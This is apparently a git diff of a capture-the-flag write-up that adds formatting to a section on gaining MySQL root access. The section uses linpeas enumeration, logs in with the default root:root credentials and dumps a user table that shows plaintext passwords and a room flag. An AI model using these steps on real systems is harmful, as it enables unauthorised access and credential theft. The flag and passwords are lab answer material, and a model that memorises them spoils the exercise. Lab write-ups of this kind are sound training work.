@@ -9,11 +9,12 @@
 ```food:givemecookies```
 
 # root/mysql:
+
 Pass the linpeas enumeration authorization information and find that mysql uses the default login password: root:root
 /tmp$ mysql -u root -p
 
 Get the login credentials of flag2 and ramen
-
+```
 mysql> select * from user;
 ERROR 1146 (42S02): Table 'users.user' doesn't exist
 mysql> select * from User;
@@ -23,6 +24,7 @@ mysql> select * from User;
 | ramen    | noodlesRTheBest                       |
 | flag     | thm{2f30841ff8d9646845295135adda8332} |
 +----------+---------------------------------------+
+```
 
 # FLAGS:
 
